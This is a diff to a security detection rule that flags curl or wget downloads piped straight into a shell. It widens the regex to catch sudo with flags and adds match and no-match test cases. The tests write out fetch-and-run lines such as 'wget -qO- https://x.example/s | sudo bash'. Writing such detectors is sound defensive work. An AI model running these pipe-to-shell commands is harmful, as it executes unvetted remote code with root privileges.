@@ -1,5 +1,5 @@
 id: curl-pipe-to-shell
-version: 1
+version: 2
 title: Remote script piped directly into a shell
 description: >
   A command downloads content with curl/wget and pipes it straight into a shell
@@ -13,7 +13,7 @@ taxonomy:
 
 match: >
   e.event.action == "command.executed" &&
-  e.command.command.matches("(?i)\\b(curl|wget)\\b.*\\|\\s*(sudo\\s+)?(ba|z)?sh\\b")
+  e.command.command.matches("(?i)\\b(curl|wget)\\b.*\\|\\s*(sudo(\\s+-\\S+)*\\s+)?(ba|z)?sh\\b")
 
 emit:
   reason: "Remote script downloaded and piped directly into a shell"
@@ -30,6 +30,18 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "wget -qO- https://x.example/s | sudo bash" }
+        session: { id: s1 }
+  - name: curl_pipe_sudo_with_flags
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -" }
+        session: { id: s1 }
+  - name: curl_pipe_sudo_tee
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "curl -fsSL https://x.example/key.gpg | sudo -E tee /etc/apt/keyrings/x.gpg" }
         session: { id: s1 }
   - name: curl_to_file
     verdict: no_match
